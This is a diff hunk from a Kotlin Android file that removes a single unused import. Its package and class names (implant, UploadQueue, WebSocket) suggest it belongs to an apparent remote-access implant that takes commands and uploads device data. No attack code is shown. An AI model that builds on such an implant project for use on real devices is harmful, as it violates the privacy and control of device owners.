@@ -4,7 +4,6 @@ import android.content.Context
 import android.util.Log
 import com.cooperthecoder.implant.data.SharedPreferencesQuery
 import com.cooperthecoder.implant.data.UploadQueue
-import com.cooperthecoder.implant.model.Command
 import okhttp3.WebSocket
 import java.io.BufferedReader
 import java.io.InputStreamReader
